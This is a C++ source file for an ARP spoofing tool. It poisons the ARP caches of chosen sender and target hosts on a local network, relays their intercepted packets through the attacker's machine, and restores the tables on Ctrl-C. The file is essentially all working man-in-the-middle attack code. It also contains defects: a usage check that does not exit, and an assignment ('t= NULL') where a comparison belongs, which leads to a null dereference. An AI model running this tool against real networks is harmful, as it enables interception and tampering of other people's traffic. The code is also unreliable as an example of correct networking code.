#include "arpspoof.h"
#include <signal.h>

char *dev;
char errbuf[PCAP_ERRBUF_SIZE];
pcap_t *handle;
struct session_class *session_list;
struct Address myaddress;
int session_num;

static volatile int stop=0;

void interrupt(int d){
    stop =1;
}

void maintain(){
    while(!stop){
      for(int i=0; i<session_num; i++){
          sendARP(handle, session_list + i , &myaddress);
      }
      sleep(5);
    }
}

int main(int argc, char *argv[]){
    int s;
    if(argc < 4 || (argc % 2 == 1)){
        printf("Usage: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]");
    }
    session_num= (argc-2)/2;
    dev=argv[1];
    handle = pcap_open_live(dev, BUFSIZ, 0, 1000, errbuf);
    if(handle==NULL){
      fprintf(stderr, "couldn't open device %s:%s\n", dev, errbuf);
      exit(1);
    }
    struct ifreq ifr;
    memset(&ifr, 0x00, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, sizeof(ifr.ifr_name)-1);
    int fd=socket(AF_INET, SOCK_DGRAM, 0);
    if(fd==-1) { perror("socket"); exit(1);}
    if(ioctl(fd,SIOCGIFHWADDR,&ifr) == -1) { perror("ioctl"); exit(1);}
    memcpy(myaddress.MAC , ifr.ifr_hwaddr.sa_data,6);
    if(ioctl(fd, SIOCGIFADDR, &ifr)==-1) {perror("ioctl"); exit(1);}
    memcpy(myaddress.IP, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr),4);
    close(fd);

    session_list = (struct session_class *)malloc(session_num * sizeof(struct session_class));
    for(int i=0;i<session_num; i++){
        inet_aton(argv[i*2+2], (in_addr *)(session_list[i].sender.IP));
        inet_aton(argv[i*2+3], (in_addr *)(session_list[i].target.IP));
        getMACaddr(handle, &(session_list[i].sender), &myaddress);
        getMACaddr(handle, &(session_list[i].target), &myaddress);
    }
    printf("[*] arpspoofing started..\n");
    for(int i=0; i<session_num; i++){
        printf("[%d] from : ",i+1);
        printIP(&(session_list[i].sender));
        printf("[MAC:");
        printMAC(&(session_list[i].sender));
        printf("]\n");
        printf("    to : ");
        printIP(&(session_list[i].target));
        printf("[MAC:");
        printMAC(&(session_list[i].target));
        printf("]\n");
    }
    std::thread pr (maintain);
    signal(SIGINT, interrupt);
    printf("Ctrl-C to stop\n");

    struct pcap_pkthdr *header;
    const u_char* packet;
    while(!stop){
      if(!getpacket(handle, &header, &packet)) break;
      if(isARP(packet)){
        for (int i=0; i<session_num; i++){
          sendARP(handle, session_list +i, &myaddress);
        }
      }
      else{
        if(memcmp((void *)packet, myaddress.MAC, 6)) continue;
        struct session_class *t = NULL;
        for(int i=0; i<session_num; i++){
          if(!memcmp((void *)(packet +6), session_list[i].sender.MAC, 6)){
            t = session_list+i;
            break;
          }
        }
        if( t= NULL) continue;
        memcpy((void *)(packet+6), myaddress.MAC, 6);
        memcpy((void *)(packet), t->target.MAC,6);
        pcap_sendpacket(handle, packet, header->len);
      }
    }

    printf(" [*] job stopping . . .\n " );
    printf(" recovering table . . .\n ");
    for(int i=0; i < session_num; i++){
        sendARP(handle, session_list+i, &(session_list[i].target));
    }
    printf(" recovered \n");
    free(session_list);
}



    

    
